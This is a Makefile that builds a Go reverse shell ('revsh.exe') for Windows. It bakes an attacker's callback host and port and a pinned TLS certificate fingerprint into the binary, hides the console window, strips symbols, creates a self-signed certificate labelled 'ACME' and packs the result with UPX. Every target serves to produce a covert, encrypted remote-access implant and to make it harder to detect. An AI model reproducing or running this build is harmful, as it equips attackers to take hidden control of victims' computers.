BUILD=go build
OUT_WINDOWS=revsh.exe
SRC=revsh.go
SRV_KEY=server.key
SRV_PEM=server.pem
WIN_LDFLAGS=--ldflags "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"
UPX=`which upx`

all: clean depends windows64 upxpack

depends:
	openssl req -subj '/CN=acme.com/O=ACME/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	cat ${SRV_KEY} >> ${SRV_PEM}

windows32:
	GOOS=windows GOARCH=386 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS} ${SRC}

windows64:
	GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS} ${SRC}

clean:
	rm -f ${SRV_KEY} ${SRV_PEM} ${OUT_WINDOWS}

upxpack:
	test -n "${UPX}" -a -x "${UPX}" && upx ${OUT_WINDOWS}
